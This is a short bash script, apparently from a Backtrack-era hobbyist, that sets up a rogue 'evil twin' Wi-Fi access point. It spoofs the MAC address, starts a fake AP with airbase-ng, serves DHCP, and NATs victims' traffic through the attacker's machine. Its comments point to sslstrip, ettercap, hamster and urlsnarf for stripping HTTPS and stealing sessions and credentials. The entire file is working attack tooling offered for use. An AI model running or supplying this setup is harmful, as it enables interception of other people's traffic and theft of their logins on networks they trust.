#!/bin/bash
#script for internet connection v0.1
#author rahil 
#date:12/2/2012
#website:lihars.tk
#this is refined form of original scripts that can be found on backtrack-linux.org/forum 
#to do--integrate with hamster,urlsnarf and other tools
#to do--make user friendly
#http://code.google.com/p/rsfakeap/downloads/list
echo "Kill airbase." 
pkill airbase-ng 
echo "Kill dhcp" 
pkill dhcpd3 
/etc/init.d/networking restart 
rmmod rtl8187 
modprobe r8187 
ifconfig wlan0 down 
macchanger -a wlan0 
echo "Putting interface in monitor mode" 
airmon-ng stop wlan0                # Change it accordingly 
airmon-ng start wlan0               # Change it accordingly 
echo "Start Fake AP" 
airbase-ng -e hansraj -c 11 -v mon0 &       # Change essid, channel and interface accordingly 
sleep 12 
ifconfig at0 up 
ifconfig at0 10.0.0.254 netmask 255.255.255.0    #  IP addresses as  in the dhcpd.conf 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254 
sleep 5 
iptables --flush 
iptables --table nat --flush 
iptables --delete-chain 
iptables --table nat --delete-chain 
iptables -P FORWARD ACCEPT 
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 
#  eth0 is the internet facing interface change it accordingly 
echo > '/var/lib/dhcp3/dhcpd.leases' 
ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid 
dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 & 
sleep 5 
echo "1" > /proc/sys/net/ipv4/ip_forward 
sleep 10
#after this use ettercap,ssltrip etc.

